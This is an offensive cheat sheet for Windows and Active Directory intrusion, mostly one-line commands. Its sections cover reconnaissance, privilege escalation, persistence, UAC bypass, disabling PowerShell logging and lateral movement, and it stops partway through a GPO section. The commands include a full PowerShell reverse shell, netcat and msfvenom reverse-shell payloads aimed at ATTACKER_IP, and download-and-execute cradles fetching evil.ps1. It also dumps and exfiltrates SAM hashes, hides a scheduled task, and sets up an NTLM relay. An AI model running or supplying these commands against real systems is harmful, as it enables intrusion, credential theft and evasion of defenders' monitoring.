https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference -> bypasses:  https://github.com/HackingLZ/ExtractedDefender/tree/main/asr

https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-downloads-interruptions

https://support.microsoft.com/en-us/office/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519

https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol

## Summary
- [General](#general)
- [Initial Recognition](#initial-recognition)
- [Domain Enumeration](#domain-enumeration)
- [GPO Policy](#gpo-policy)
- [Privilege Escalation](#privilege-escalation)
- [UAC Bypass Methods](#uac-bypass-methods)
- [Evading Logging](#evading-logging)
- [File Transfer](#file-transfer)
- [Event Logs and Sysmon](#event-logs-and-sysmon)
- [Remote Execution](#remote-execution)
- [Rdp-Hijacking](#rdp-hijacking)
- [Authentication Relays](#authentication-relays)
- [Exploiting GPOs](#exploiting-gpos)
- [Bloodhound + Extra Queries](#bloodhound-extra-queries)
- [Finding Vulnerable Certificate Templates](#finding-vulnerable-certificate-templates)
- [Persistence in AD](#persistence-in-ad)
- [Credential harvesting](#persistence-in-ad)
- [Kerberoasting](#kerberoasting)
- [PASS THE HASH/OVERPASS THE HASH AND ETC MIMIKATZ](#pass-the-hashoverpass-the-hash-and-etc-mimikatz)
- [Persisting through AD Group Templates](#persisting-through-ad-group-templates)
- [Finding Vulnerable Certificate Templates](#finding-vulnerable-certificate-templates)
- [Permission Delegation](#permis)
- [Kerberos UNCONSTRAINED DELEGATION](#kerberos-unconstrained-delegation)
- [Kerberos CONSTRAINED DELEGATION ](#constrained-delegation)
- [Resource-based Constrained Delegation](#resource-based-constrained-delegation)
- [Forest Privesc](#forest-privesc)
- [Trust Abuse - MSSQL Servers](#trust-abuse---mssql-servers)
- [OPSEC proposals, offensive Notes, DEFENSES ](#opsec-proposals-notes-defenses)

## General
Commands to bypass execution policy and other general PowerShell commands.
- `powershell –ExecutionPolicy bypass`
- `powershell –c <cmd>`
- `powershell –encodedcommand`
- `$env:PSExecutionPolicyPreference="bypass"`

- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
When the PC is not joined to the domain and we have AD credentials we can use Runas to inject the credentials into memory.So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the domain account specified.

- `$client = New-Object System.Net.Sockets.TCPClient('10.50.112.55',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`Reverse Shell 

- `$dnsip = "<DC IP>"`, `$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'`, `Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip`.Setup DNS via PowerShell if not automatically configured:  (Typically, the DC is the DNS server.)


## Initial Recognition
Commands for initial reconnaissance including system info, network stats, and user privileges.
- **Netstat:** `netstat -na`
- **ARP Table:** `arp -a`
- **Same machine Port enumeration**`for($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}`
- **Other machine discovery**
`1..255 | %{echo "10.0.2.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}`
- **Other machines Open ports**
`1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null`
- **Domain Check:** `systeminfo | findstr Domain`
- **System Information:** `systeminfo`
- **IP Configuration:** `ipconfig /all`
- **IPs, Ports, Processes Correlation:** `netstat -abno`
- **User Privileges:** `whoami /priv`
- **User Group Memberships:** `whoami /groups`
- **SMB Shares:** `net share`
- **Shares on Hosts in Current Domain:** `Invoke-ShareFinder–Verbose`
- **Sensitive File Finder in Domain:** `Invoke-FileFinder–Verbose`
- **File Servers of the Domain:** `Get-NetFileServer`
- **Enumerate Users and Groups:**  `net user`, ,`net user /domain` `net group`, `net group /domain`,`net localgroup`, `net localgroup administrators`, `Get-ADUser -Filter *`, `net user nikos.alvanos /domain`.
- **Password Policies:** `net accounts /domain`
- **Check the service state for Windows Defender:** `Get-Service WinDefend`
- **Check the options enabled or disabled on Antivirus:** `Get-MpComputerStatus` Optional: `| select RealTimeProtectionEnabled`
- **Check Firewall profiles:** `Get-NetFirewallProfile` Optional quick check: `| Format-Table Name, Enabled`
- **Inspect firewall rules:** `Get-NetFirewallRule | select DisplayName, Enabled, Direction, Action`
- **Disable Firewall profiles if admin permissions are available:** `Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False`
- **Test connections for inbound connections, open ports, and other computers in the network:** `Test-NetConnection -ComputerName 127.0.0.1 -Port 80`, `(New-Object System.Net.Sockets.TcpClient("127.0.0.1","80").Connected)`
- **Find Specific service of interest**
`wmic service where "name like 'Vuln Service'" get name,PathName`,`Get-Process -Name OXI-service`,`nestat -aon |findstr "LISTENING" | findstr "3212"`
- **LDAP Enumeration:** Examples with 
`Get-ADUser -Filter * -SearchBase "CN=Users,DC=EIMAIREDTEAM,DC=COM"`Using the SearchBase option, we specify a specific Common-Name CN,The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN)
- **Access SYSVOL using Kerberos or NTLM authentication:** `dir \\za.NAI.com\SYSVOL`, `dir \\<DC IP>\SYSVOL` (The first uses Kerberos, and the second uses a stealthier NTLM authentication method.)

- **AV Detection:** `wmic /namespace:\root\securitycenter2 path antivirusproduct` and `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct` Windows servers may not have SecurityCenter2 namespace, but workstations have
- **File and Directory Permissions:** Owner of a directory `Get-Acl c:/`, View the permissions set on a directory `icacls <directory>`, give full perms on dir`icacls c:\users /grant joe:f` , Remove a users' permissions on a directory
`icacls c:\users /remove joe` and `Get-Location` = pwd
- **Processes** `Get-Process`
- **Listening Ports and Installed Updates:** `Get-NetTCPConnection | Where-Object -Property state -Match Listen `, `wmic qfe get Caption, Description`, and `Get-HotFix`, `Get-Hotfix -Id KB4023834`
- **Scheduled Tasks:** Examples with `Get-ScheduledTask -TaskName new-sched-task` and `schtasks /query /tn vulntask /fo list /v`
- **File Searches:** ``Get-ChildItem -Path C:\ -Include *interesting-fle.txt* -File -Recurse -ErrorAction SilentlyContinue` and `Get-Content "C:\Program Files\interestingfile.txt.txt"` for specific files

## Domain Enumeration
- **Uncover Domain Controllers via DNS (Location of services through the DNS SRV type, without having to scan a single port)**  
`dig -t SRV _ldap._tcp.goblins.local`Linux based systems, `Resolve-DnsName -Type SRV _ldap._tcp.goblins.local`From PowerShell, `nslookup -type=srv _ldap._tcp.goblins.local` From Windows CMD

Commands specific to domain enumeration, including user and group listings, domain controllers, and policies.
- **Install RSAT Tools and perform enumeration**`Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online`
- **Current Domain Information:** `Get-Domain` (PowerView), `Get-ADDomain` (ActiveDirectory Module)
- **Domain object and SID:** `Get-Domain–Domain moneycorp.local` `Get-ADDomain-Identity moneycorp.local`, `Get-DomainSID` `(Get-ADDomain).DomainSID`
- **Get domain policy for the current domain** `Get-DomainPolicyData` `(Get-DomainPolicyData).systemaccess`
- **Get domain policy for another domain**`(Get-DomainPolicyData–domain moneycorp.local).systemaccess`

- **Domain Controllers:** Listing and discovering domain controllers with `Get-DomainController`, `Get-ADDomainController`, `Get-DomainController–Domain moneycorp.local`, `Get-ADDomainController -DomainName moneycorp.local -Discover`
- **User Listings:** Examples with `Get-DomainUser`, `Get-DomainUser–Identity student1` `Get-ADUser -Filter * -Properties *`, `Get-ADUser -Identity student1 -Properties *`
- **Get list of all properties for users in the current domain:** `Get-DomainUser -Identity student1 -Properties * Get-DomainUser -Properties samaccountname,logonCount Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member - MemberType *Property | select Name`,
`Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset )}}`
- **Get all the groups in the current domain**
`Get-DomainGroup | select Name`,`Get-DomainGroup–Domain <targetdomain>`,`Get-ADGroup -Filter * | select Name`,`Get-ADGroup -Filter * -Properties *`
- **Group Listings:** Get all groups containing the word "admin" in group name
`Get-DomainGroup *admin*` `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
- **Active users with high logoncount:**Check for active users with high logoncount, bad idea to target low logoncount users.`Get-DomainUser -Properties samaccountname,logonCount`
- **Check descriptions, passwords or ...**
`Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description`
- **Get a list of computers in the current domain**
`Get-DomainComputer | select Name`
`Get-DomainComputer–OperatingSystem "*Server 2016*"`
`Get-DomainComputer -Ping` `Get-ADComputer -Filter * | select Name`
`Get-ADComputer -Filter * -Properties *` `Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem` `Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
- **Get all the groups in the current domain.**
`Get-DomainGroup | select Name` `Get-DomainGroup–Domain <targetdomain>` `Get-ADGroup -Filter * | select Name` `Get-ADGroup -Filter * -Properties *`
- **Get all groups containing the word "admin" in group name**
`Get-DomainGroup *admin*` `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
- **Get all the members of the Domain Admins group**
`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`,`Get-ADGroupMember -Identity "Domain Admins" -Recursive`
- **Get the group membership for a user**:
`Get-DomainGroup–UserName "student1"`,`Get-ADPrincipalGroupMembership -Identity student1`
- **List all the local groups on a machine (needs administrator privs on non-dc machines):** `Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups`
- **Get members of all the local groups on a machine (needs administrator privs on non-dc machines)** `Get-NetLocalGroup -ComputerName dcorp-dc -Recurse`
- **Members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :** `Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators`
- ** actively logged users on a computer (needs local admin rights on the target)
`Get-NetLoggedon–ComputerName <servername>`
- **Get actively logged users on a computer (needs local admin rights on the target)**
`Get-LoggedonLocal -ComputerName dcorp-dc`
- **Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)**
- **Get the last logged user on a computer (needs administrative rights and remote registry on the target)**
`Get-LastLoggedOn–ComputerName <servername>`

## GPO Policy
Commands related to Group Policy Objects (GPO) in Active Directory environments.
- **List of GPO in Current Domain:** `Get-DomainGPO`, `Get-DomainGPO -ComputerIdentity dcorp-student1`
- **GPOs Using Restricted Groups:** `Get-DomainGPOLocalGroup`
- **Users in Local Group via GPO:** `Get-DomainGPOComputerLocalGroupMapping–ComputerIdentity dcorp-student1`
- **Machines with User as Specific Group Member via GPO:** `Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose`
- **Organizational Units (OUs):** `Get-DomainOU`, `Get-ADOrganizationalUnit -Filter * -Properties *`
- **GPO Applied on an OU:** `Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"`
- **ACLs for Objects:** `Get-DomainObjectAcl -SamAccountName student1–ResolveGUIDs`,
- **Get the ACLs associated with the specified prefix to be used for search**`Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose`
- **We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs**`(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`
- **Search for interesting ACEs:** `Find-InterestingDomainAcl -ResolveGUIDs`
- **Get the ACLs associated with the specified path:** `Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`
- **Get a list of all domain trusts for the current domain:** `Get-DomainTrust`, `Get-DomainTrust–Domain us.dollarcorp.moneycorp.local`
- **Get AD Trust details:** `Get-ADTrust`, `Get-ADTrust–Identity us.dollarcorp.moneycorp.local`
- **Get details about the current forest:** `Get-Forest`, `Get-Forest–Forest eurocorp.local`, `Get-ADForest`, `Get-ADForest–Identity eurocorp.local`
- **Get all domains in the current forest:** `Get-ForestDomain`, `Get-ForestDomain–Forest eurocorp.local`, `(Get-ADForest).Domains`
- **Get all global catalogs for the current forest:** `Get-ForestGlobalCatalog`, `Get-ForestGlobalCatalog–Forest eurocorp.local`, `Get-ADForest | select -ExpandProperty GlobalCatalogs`
- **Map trusts of a forest:** `Get-ForestTrust`, `Get-ForestTrust–Forest eurocorp.local`, `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`
- **Find computers where a domain admin session is available:** `Find-DomainUserLocation –Stealth`
- **BloodHound to avoid detections like ATA:** `Invoke-BloodHound -CollectionMethod All -ExcludeDC`

## Privilege Escalation
Techniques and commands for elevating privileges.
- **Powershell history:** `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- **IIS Configuration file (passwords for databases):** `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
- **Retrieve Credentials from PuTTY:** `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

- **List Scheduled tasks:** `schtasks /query /tn vulntask /fo list /v`
- **Check the file permissions (if we can modify or overwrite):** `icacls c:\tasks\schtask.bat`
- **Modify the file and insert the payload:** `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
- **Run the task:** `schtasks /run /tn vulntask`

- **Unquoted Service Paths:** `Get-WmiObject win32_service | select Name, DisplayName, State, PathName`,`Get-ServiceUnquoted -Verbose`
- **Generate the service executable (if we find a Path to an executable with spaces that is unquoted we win):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`
- **Get services where the current user can write to its binary path or change arguments to the binary**
`Get-ModifiableServiceFile-Verbose`
- **Get the services whose configuration current user can modify.**
`Get-ModifiableService-Verbose`
- **Move the reverse shell service to the first unquoted directory that you find in the path:** `move C:\Users\OXI-unpriv\reverse-svc2.exe C:\MyPrograms\Disk.exe`
- **Restart the service:** `sc stop "disk sorter enterprise"`, `sc start "disk sorter enterprise"`

- **SeBackup / SeRestore (Pass the hash through SMB share and Registry dump):** `reg save hklm\system C:\Users\OXIBackup\system.hive`, `reg save hklm\sam C:\Users\OXIBackup\sam.hive` The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.
- **Create a share between the machines:** `mkdir share`,`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username OXIBackup -password CopyMaster555 public share`
- **Copy the files to the share:** `copy C:\Users\OXIBackup\sam.hive \\ATTACKER_IP\public\`, `copy C:\Users\OXIBackup\system.hive \\ATTACKER_IP\public\` Copy the files to the share
- **Use impacket to retrieve the users' password hashes:** `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`
- **Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:** `python3.9 /opt/impacket/examples/psexec.py -hashes`

- **RID Hijacking:** `wmic useraccount get name,sid` Check the SID (Remember 500 is admin)
- **Run regedit as System through PsExec:** `PsExec64.exe -i -s regedit`
- **Modify the user's RID in the registry to hijack the RID:** *From Regedit, navigate to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify user3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID. Notice the RID is stored using little-endian notation, so its bytes appear reversed. We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401)

- **Add user to administrators group:** `net localgroup administrators user0 /add`, `net localgroup "Remote Management Users" user1 /add`

- **Backdooring files with msfvenom:** `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe`

- **Persisting through services by creating a service:** `sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto`

- **Create Services with reverse shell:** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe`, `sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto`, `sc.exe start service`

- **Replace Service executables for persistence:** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe`, `sc.exe query state=inactive`, `sc.exe config service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`

- **Create Scheduled Tasks for persistence:** `schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM`, `c:\tools\pstools\PsExec64.exe -s -i regedit`, Navigate to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ and find the Schedule task that we created and delete the Security Descriptor (SD) to make our schedule task invisible

- **Place your file in Startup for user persistence:** Place your file in C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup for user-level persistence, For global persistence, place it in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

- **Registry persistence:** Open registry with regedit and navigate to HKCU\Software\Microsoft\Windows\CurrentVersion\Run for current user persistence or HKLM\Software\Microsoft\Windows\CurrentVersion\Run for system-wide persistence. Create a new Expandable String Value with the path to your executable.`

- **Winlogon persistence method one:** Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon and append commands to Userinit or Shell entries.

- **Winlogon persistence method two:** Go to HKCU\Environment in the registry and create a new Expandable String Value named UserInitMprLogonScript for your script.

## UAC Bypass Methods
- **UAC Bypass methods for admin privileges (Run from cmd, to bypass defender):** Check your group integrity level with `whoami /groups | find "Label"`, We want high integrity if we want to have admin perms on a process no matter if we are already an admin. If we have medium do the following:
`set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"`
`reg add "HKCU\Software\Classes\.Servic3\Shell\Open\command" /d %CMD% /f`
`reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".Servic3" /f`
`fodhelper.exe`
`reg delete "HKCU\Software\Classes\.Servic3\" /f`
`reg delete "HKCU\Software\Classes\ms-settings\" /f`

## Evading Logging
- **Disable Event Tracing Windows provider ( create a .ps1 and Invoke-Obfuscation)**
`$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')`
`$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)`
`[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);`
- **GPO takeover (create a .ps1 and Invoke-Obfuscation)**
Disable only what hurts us : 4103-Logs command invocation(module logging), 4104-Logs script block execution**
`$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')`
`$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0`
- **Abusing Log Pipeline - Disable module loggin (4103-Logs command invocation) for a particular session**
`$module = Get-Module Microsoft.PowerShell.Utility` Get target module
`$module.LogPipelineExecutionDetails = $false` Set module execution details to false
`$snap = Get-PSSnapin Microsoft.PowerShell.Core`Get target ps-snapin
`$snap.LogPipelineExecutionDetails = $false` Set ps-snapin execution details to false`

## File Transfer
- **Download files using a Chrome User Agent:** `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` using a Chrome User Agent
- **Run directly in memory:** `(New-Object System.NetWebClient).Downloadfile('http://') | IEX` 
- **Download a file with Invoke-WebRequest:** `Invoke-WebRequest "http:///" -OutFile "kati.ps1"`
- **Download a file with certutil:** `certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe`
- **Download a file with bitsadmin:** `bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\OXI\Desktop\payload.exe`
- **Download from an SMB shared folder:** `findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe`
- **Download a file using SCP:** `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`

- **Upload a file using SCP:** `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
- **Upload a file using FTP:** `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

## Event Logs and Sysmon
- **Get Event logs for applications and services insights:** `Get-EventLog -List`
- **Check if sysmon is present for potential logging:** `Get-Process | Where-Object { $_.ProcessName -eq "Sysmon"}`, `Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"`, `Get-Service | where-object {$_.DisplayName -like "*sysm*"}`, `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational`
- **Find the sysmon configuration file to understand monitoring scope (Careful, may trigger AV):** `findstr /si '<ProcessCreate onmatch="exclude">' C:\*`


- **Perform DNS zone transfer with nslookup:** `nslookup.exe`, `server myIp`, `ls -d DomainName` or `dig -t AXFR DOMAIN_NAME @DNS_SERVER` The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME

- **Simple Network Management Protocol (SNMP) setup and usage:** `git clone https://gitlab.com/kalilinux/packages/snmpcheck.git`, `cd snmpcheck/`, `gem install snmp`, `chmod +x snmpcheck-1.9.rb`, `snmpcheck.rb 10.10.235.90 -c COMMUNITY_STRING` or `snmpwalk -v1 -c public 10.10.114.235`Community string is default some times to Public, but it can be found on other devices like routers and etc.The “SNMP community string” is like a user ID or password that allows access to a router's or other device's statistics.

## LDAP and Responder
- **LDAP Pass-back Attacks overview:** Setup an LDAP server: `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`, `sudo dpkg-reconfigure -p low slapd`
Make the server support only PLAIN and LOGIN authentication methods: Create a file with name -> `olcSaslSecProps.ldif` with specific properties :
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`, `sudo tcpdump -SX -i eth0 tcp port 389` *(Capture LDAP server traffic to check credentials.)*

- **Use Responder to poison LLMNR and NBT-NS requests:** `sudo responder -I tun0` (Responder listens for network requests to send poisoned responses, directing the requesting host to our IP.)

## Remote Execution
- **PSexec (remote command exec)**
    Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
    Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
    Create some named pipes to handle stdin/stdout/stderr.

`psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`

# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname

# Load a PowerShell script using dot sourcing
`. C:\AD\Tools\PowerView.ps1`
# A module (or a script) can be imported with:
`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
# All the commands in a module can be listed with:
`Get-Command -Module <modulename>`
# Download execute cradle
`iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
`$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`

`iex (iwr 'http://192.168.230.1/evil.ps1'

`$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText`
`$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

# (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
# We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`

# The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
https://github.com/samratashok/ADModule
`Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`
`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`

- **Common code for the below tecniques**
``$username = 'Administrator';`
`$password = 'Mypass123';`
`$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; `
`$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`

`smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//OXIiis.za.NAI.com/admin$/' EZpass4ever` *Upload what you want to execute on the shares (depends on the method you choose)*

- **WinRM remote exec(required: Remote Management Users group- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))**
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd` *One way*
`Enter-PSSession -Computername TARGET -Credential $credential`
`Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`

- **WMI remote powershell through DCOM (port 135/TCP and ports 49152-65535/TCP)**
`$Opt = New-CimSessionOption -Protocol DCOM`
`$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`

- **WMI remote Process Creating**
`$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";`
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command }`

- **WMI remote services**
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "OXIService2";
DisplayName = "OXIService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'OXIService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

-**WMI remote scheduled tasks**
`$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "OXItask2"
Start-ScheduledTask -CimSession $Session -TaskName "OXItask2"
Unregister-ScheduledTask -CimSession $Session -TaskName "OXItask2"`

- **WMI remote MSI installation**
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

-**sc.exe (Remote services)**
`sc.exe \\TARGET create OXIservice binPath= "net user munra Pass123 /add" start= auto`
`sc.exe \\TARGET start OXIservice`
`sc.exe \\TARGET stop OXIservice`
`sc.exe \\TARGET delete OXIservice`

-**Schedule task (remote run)**
`schtasks /s TARGET /RU "SYSTEM" /create /tn "OXItask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 `
`schtasks /s TARGET /run /TN "OXItask1" `
`schtasks /S TARGET /TN "OXItask1" /DELETE /F`

## RDP hijacking 
-**RDP hijacking(without password before Windows server 2019)**
`PsExec64.exe -s cmd.exe`*Get system priv*
`query user` *Check for State :disc*
`tscon 3 /dest:rdp-tcp#6`*Session 3 with is disc should be connected to our: tcp#6*

## Authentication Relays
- **Authentication Relays Requirements:** To exploit this vulnerability, ensure the following prerequisites are met:
  - A valid set of AD account credentials.
  - Network connectivity to the target's SMB service.
  - The target host is running the Print Spooler service.
  - The hosts do not have SMB signing enforced.

- **Enumerate for Print Spooler service:**
  - Using WMI: `GWMI Win32_Printer -Computer OXIserver2.za.NAI.loc`
  - Using PowerShell: `Get-PrinterPort -ComputerName OXIserver2.za.NAI.loc`

- **Ensure SMB signing is not enforced:**
  `nmap --script=smb2-security-mode -p445 OXIserver1.za.NAI.loc OXIserver2.za.NAI.loc`

- **Find the IP of the server:**
  `dig OXIserver1.za.NAI.loc`

- **Setup NTLM relay:**
  `python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OXISERVER1 IP" -debug`

- **Coerce a server to authenticate to us (from OXIwrk1):**
  `C:\Tools\>SpoolSample.exe OXISERVER2.za.NAI.loc "Attacker IP"`

- **Get hash dump from server1:**
  `python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OXISERVER1 IP"`


##  Exploiting GPOs

- **Adding an AD account to local groups:**
  - Inject AD user credentials: `C:\>runas /netonly /user:za.NAI.loc\<AD Username> cmd.exe`
  - Open MMC: `C:\>mmc`

- **Configure GPO:**
  1. In MMC, click **File -> Add/Remove Snap-in**.
